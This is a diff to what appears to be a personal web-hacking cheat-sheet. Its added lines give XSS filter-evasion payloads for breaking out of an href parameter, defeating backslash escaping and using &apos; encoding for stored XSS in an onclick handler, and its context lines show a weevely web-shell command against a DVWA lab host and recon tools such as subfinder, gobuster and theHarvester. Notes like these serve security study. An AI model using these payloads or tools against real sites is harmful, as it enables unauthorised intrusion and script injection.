@@ -201,6 +201,9 @@ weevely http://192.168.136.131/dvwa/hackable/uploads/shell.php 123456
 [+] Use Wappalyzer to cehck site Library
 [+] Bypaas back tick "${alert(2)}"
 [+] Escape backward slash with {\';alert(5);//}
+[+] Escape href tag parameter ');, add {alert(8);//');} behinde website url
+[-] if the WA adds a backward slash to counter, add a backward slash to the url e.g "https://google.com\');alert(8);//"
+[-] if program filter single quote change to encoding e.g "https://google.com&apos;);alert(8);//" --stored XSS into oneclick event 
 
 
 *******************************
@@ -224,6 +227,8 @@ subfinder -d (target_site)
 dirb
 
 gobuster
+
+knockpy
 
 theHarvest -d (url) -l 500 -b (where to check)
 [harvest site email]
